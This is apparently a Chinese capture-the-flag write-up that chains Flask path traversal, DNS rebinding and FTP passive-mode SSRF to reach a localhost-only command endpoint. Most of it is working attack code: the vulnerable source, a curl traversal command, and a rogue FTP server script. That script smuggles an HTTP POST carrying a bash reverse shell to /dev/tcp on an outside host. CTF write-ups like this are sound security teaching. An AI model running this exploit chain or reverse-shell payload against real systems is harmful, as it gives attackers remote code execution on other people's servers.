## 考点

* flask路径穿越读文件
* dns重绑定
* ftp ssrf

## 步骤

先贴一下题目源码：

```python
from flask import Flask, request, send_file, abort
from io import BytesIO
import os
import socket
import ftplib

app = Flask(__name__, static_url_path='')

@app.route("/")
def index():
    return send_file('index.html')

@app.route('/static/<path:path>')
def static_files(path):
    file = os.path.join('static', path)
    if os.path.isfile(file):
        return send_file(file)
    else:
        abort(404)

@app.route("/ftpcheck", methods=['POST'])
def ftpcheck():
    ftpaddr = os.environ['FTPADDR']
    # ftpaddr = '127.0.0.1'
    host = request.form.get('host', '')
    if host == '':
        host = ftpaddr
    try:
        if socket.gethostbyname(host) != ftpaddr:
            return f'Only the specified ftp server {ftpaddr} is acceptable!'
    except:
        return 'Something is wrong, maybe host is invalid.'
    file = 'robots.txt'
    fp = BytesIO()
    try:
        with ftplib.FTP(host) as ftp:
            ftp.login("admin","admin")
            ftp.retrbinary('RETR ' + file, fp.write)
    except ftplib.all_errors as e:
        return 'FTP {} Check Error: {}'.format(host,str(e))
    fp.seek(0)
    try:
        with ftplib.FTP(host) as ftp:
            ftp.login("admin","admin")
            ftp.storbinary('STOR ' + file, fp)
    except ftplib.all_errors as e:
        return 'FTP {} Check Error: {}'.format(host,str(e))
    fp.close()
    return 'FTP {} Check Success.'.format(host)

@app.route("/shellcheck", methods=['POST'])
def shellcheck():
    if request.remote_addr != '127.0.0.1':
        return 'Localhost only'
    shell = request.form.get('shell', '')
    if shell == '':
        return 'Parameter "shell" Empty!'
    return str(os.system(shell))

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8080)

```

注意到静态文件处理没有使用标准配置，而是自己写了一个static_files函数，代码如下，将用户传入的path参数拼接至字符串'static'之后返回该文件，因此存在目录穿越漏洞，访问/static/../app.py即可获取源码。注意curl和浏览器会进行标准化，因此可以使用burp suite或者`curl http://175.24.70.252:30001/static/../app.py --path-as-is`访问这一路径。

```python
@app.route('/static/<path:path>')
def static_files(path):
    file = os.path.join('static', path)
    if os.path.isfile(file):
        return send_file(file)
    else:
        abort(404)
```

回到题目，/shellcheck路由可访问一个限制本地访问的webshell，而/ftpcheck路由刚好存在SSRF漏洞，原理与`CVE-2021-3129`一致，可以参考https://www.anquanke.com/post/id/233454。

但由于代码会对我们传入的host进行判断，只有传入的域名解析为指定的ip地址（这里指定的ip地址为172.20.0.7，可以通过触发一次/ftpcheck获取）才可以进行后续操作，因此可以考虑**DNS重绑定**攻击，将域名的资源记录的TTL设置为0，第一次解析返回172.20.0.7，第二、第三次解析返回自己服务器的地址，然后在自己服务器中运行如下脚本，同时监听7777端口，即可反弹shell。

```
import socket
from urllib.parse import unquote

# 这里填入自己服务器的ip地址和接收反弹shell的端口
shell_ip = '8.8.8.8'
shell_port = '7777'

# 对payload进行一次urldecode
payload = unquote("POST%20/shellcheck%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2083%0D%0A%0D%0Ashell%3Dbash%2520-c%2520%2522bash%2520-i%2520%253E%2526%2520/dev/tcp/{}/{}%25200%253E%25261%2522".format(shell_ip, shell_port))
payload = payload.encode('utf-8')

host = '0.0.0.0'
port = 21
sk = socket.socket()
sk.bind((host, port))
sk.listen(5)

# ftp被动模式的passvie port,监听到1234
sk2 = socket.socket()
sk2.bind((host, 1234))
sk2.listen()

# 计数器，用于区分是第几次ftp连接
count = 1
while 1:
    conn, address = sk.accept()
    print("220 ")
    conn.send(b"220 \n")
    print(conn.recv(20))  # USER aaa\r\n  客户端传来用户名
    print("220 ready")
    conn.send(b"220 ready\n")

    print(conn.recv(20))   # TYPE I\r\n  客户端告诉服务端以什么格式传输数据，TYPE I表示二进制， TYPE A表示文
    print("200 ")
    conn.send(b"200 \n")

    print(conn.recv(20))   # PASV\r\n  客户端告诉服务端进入被动连接模式
    if count == 1:
        print("227 %s,4,210" % (shell_ip.replace('.', ',')))
        conn.send(b"227 %s,4,210\n" % (shell_ip.replace('.', ',').encode()))  # 服务端告诉客户端需要到那个ip:port去获取数据,ip,port都是用逗号隔开，其中端口的计算规则为：4*256+210=1234
    else:
        print("227 127,0,0,1,31,144")
        conn.send(b"227 127,0,0,1,31,144\n")  # 端口计算规则：35*256+40=9000

    print(conn.recv(20))  # 第一次连接会收到命令RETR /123\r\n，第二次连接会收到STOR /123\r\n
    if count == 1:
        print("125 ")
        conn.send(b"125 \n") # 告诉客户端可以开始数据链接了
        # 新建一个socket给服务端返回我们的payload
        print("建立连接!")
        conn2, address2 = sk2.accept()
        conn2.send(payload)
        conn2.close()
        print("断开连接!")
    else:
        print("150 ")
        conn.send(b"150 \n")

    # 第一次连接是下载文件，需要告诉客户端下载已经结束
    if count == 1:
        print("226 ")
        conn.send(b"226 \n")
    
    print(conn.recv(20))  # QUIT\r\n
    print("221 ")
    conn.send(b"221 \n")
    conn.close()
    count += 1

```

